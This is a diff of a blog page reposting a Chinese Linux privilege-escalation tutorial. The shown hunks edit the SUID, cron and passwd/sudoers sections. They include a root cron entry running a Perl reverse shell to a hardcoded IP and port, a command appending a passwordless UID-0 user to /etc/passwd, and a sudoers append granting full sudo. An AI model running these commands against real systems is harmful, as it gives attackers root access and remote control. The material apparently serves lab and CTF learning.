@@ -79,13 +79,13 @@
 
 
 
-<meta name="description" content="转载自 https:&#x2F;&#x2F;www.cnblogs.com&#x2F;zaqzzz&#x2F;p&#x2F;12075132.html  目录  1.suid提权 2.rbash绕过 3.git提权 4.Linux Kernel 4.4.x (Ubuntu 16.04) - ‘double-fdput()’ bpf(BPF_PROG_LOAD) Privilege Escalation 5.sudoer配置文件错误提权 5.1 基">
+<meta name="description" content="转载自 https:&#x2F;&#x2F;www.cnblogs.com&#x2F;zaqzzz&#x2F;p&#x2F;12075132.html  1.suid提权1运行某些程序时暂时获得root的权限，例如ping(socket需要root才能运行)  搜索符合条件的可以用来提权的： 1234# 三种都可以find &#x2F; -perm -u=s -type f 2&amp;gt;&#x2F;dev&#x2F;nullfind &#x2F; -user root -perm -40">
 <meta name="keywords" content="笔记">
 <meta property="og:type" content="article">
 <meta property="og:title" content="linux提权">
 <meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;02&#x2F;linux%E6%8F%90%E6%9D%83&#x2F;index.html">
 <meta property="og:site_name" content="t0ng">
-<meta property="og:description" content="转载自 https:&#x2F;&#x2F;www.cnblogs.com&#x2F;zaqzzz&#x2F;p&#x2F;12075132.html  目录  1.suid提权 2.rbash绕过 3.git提权 4.Linux Kernel 4.4.x (Ubuntu 16.04) - ‘double-fdput()’ bpf(BPF_PROG_LOAD) Privilege Escalation 5.sudoer配置文件错误提权 5.1 基">
+<meta property="og:description" content="转载自 https:&#x2F;&#x2F;www.cnblogs.com&#x2F;zaqzzz&#x2F;p&#x2F;12075132.html  1.suid提权1运行某些程序时暂时获得root的权限，例如ping(socket需要root才能运行)  搜索符合条件的可以用来提权的： 1234# 三种都可以find &#x2F; -perm -u=s -type f 2&amp;gt;&#x2F;dev&#x2F;nullfind &#x2F; -user root -perm -40">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;linux%E6%8F%90%E6%9D%83&#x2F;006HACgnly1g9veez77rpj30qu0d50tq.jpg">
 <meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;linux%E6%8F%90%E6%9D%83&#x2F;006HACgnly1g9veez318xj30fg015gle.jpg">
@@ -102,7 +102,7 @@
 <meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;linux%E6%8F%90%E6%9D%83&#x2F;006HACgnly1ga3hoon4b0j30md03w3yg.jpg">
 <meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;linux%E6%8F%90%E6%9D%83&#x2F;006HACgnly1ga3i2tes3dj30fm04i745.jpg">
 <meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;linux%E6%8F%90%E6%9D%83&#x2F;006HACgnly1ga3i74tyc2j30do04fjr9.jpg">
-<meta property="og:updated_time" content="2020-04-03T11:01:31.406Z">
+<meta property="og:updated_time" content="2020-04-04T10:28:37.554Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;linux%E6%8F%90%E6%9D%83&#x2F;006HACgnly1g9veez77rpj30qu0d50tq.jpg">
 
@@ -412,18 +412,6 @@
 
       
         <p>转载自 <a href="https://www.cnblogs.com/zaqzzz/p/12075132.html" target="_blank" rel="noopener">https://www.cnblogs.com/zaqzzz/p/12075132.html</a> </p>
-<p>目录</p>
-<ul>
-<li><a href="https://www.cnblogs.com/zaqzzz/p/12075132.html#1suid提权" target="_blank" rel="noopener">1.suid提权</a></li>
-<li><a href="https://www.cnblogs.com/zaqzzz/p/12075132.html#2rbash绕过" target="_blank" rel="noopener">2.rbash绕过</a></li>
-<li><a href="https://www.cnblogs.com/zaqzzz/p/12075132.html#3git提权" target="_blank" rel="noopener">3.git提权</a></li>
-<li><a href="https://www.cnblogs.com/zaqzzz/p/12075132.html#4linux-kernel-44x-ubuntu-1604---double-fdput-bpfbpf_prog_load-privilege-escalation" target="_blank" rel="noopener">4.Linux Kernel 4.4.x (Ubuntu 16.04) - ‘double-fdput()’ bpf(BPF_PROG_LOAD) Privilege Escalation</a></li>
-<li>5.sudoer配置文件错误提权<ul>
-<li><a href="https://www.cnblogs.com/zaqzzz/p/12075132.html#51-基础知识" target="_blank" rel="noopener">5.1 基础知识</a></li>
-<li><a href="https://www.cnblogs.com/zaqzzz/p/12075132.html#52-提权" target="_blank" rel="noopener">5.2 提权</a></li>
-</ul>
-</li>
-</ul>
 <h2 id="1-suid提权"><a href="#1-suid提权" class="headerlink" title="1.suid提权"></a>1.suid提权</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">运行某些程序时暂时获得root的权限，例如ping(socket需要root才能运行)</span><br></pre></td></tr></table></figure>
 
 <p>搜索符合条件的可以用来提权的：</p>
@@ -485,7 +473,7 @@
 
 <p><img src="/images/linux%E6%8F%90%E6%9D%83/006HACgnly1ga3hnacenqj30n3016mwz.jpg" alt="Snipaste_2019-12-20_20-06-26.png"></p>
 <p><img src="/images/linux%E6%8F%90%E6%9D%83/006HACgnly1ga3hnadeb7j30m00703yn.jpg" alt="Snipaste_2019-12-20_20-06-41.png"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">或者：</span><br><span class="line">*/1 * * * * root perl -e &apos;use Socket;$i=&quot;106.13.124.93&quot;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">或者：</span><br><span class="line">*/1 * * * * root perl -e 'use Socket;$i="106.13.124.93";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span><br></pre></td></tr></table></figure>
 
 <p><img src="/images/linux%E6%8F%90%E6%9D%83/006HACgnly1ga3hoontrpj30q904l74g.jpg" alt="Snipaste_2019-12-20_20-03-53.png"></p>
 <p><img src="/images/linux%E6%8F%90%E6%9D%83/006HACgnly1ga3hoon4b0j30md03w3yg.jpg" alt="Snipaste_2019-12-20_20-04-11.png"></p>
@@ -494,11 +482,13 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">值得注意的是：chmod 4777 /bin/bash不会有这种效果(曾经看到这个解答，我给忘了，你不用管为什么了，自己试试就好了)</span><br></pre></td></tr></table></figure>
 
 <p><strong>3.passwd添加用户</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test:x:0:0::/home/admin:/bin/bash</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo "test::0:0:::/bin/bash" | sudo teehee -a /etc/passwd</span><br></pre></td></tr></table></figure>
 
 <p><img src="/images/linux%E6%8F%90%E6%9D%83/006HACgnly1ga3i74tyc2j30do04fjr9.jpg" alt="Snipaste_2019-12-20_21-22-05.png"></p>
 <p><strong>4.sudoers文件</strong></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo "charles ALL=(ALL:ALL) ALL" | sudo teehee -a /etc/sudoers</span><br></pre></td></tr></table></figure>
+
+
       
     </div>
     
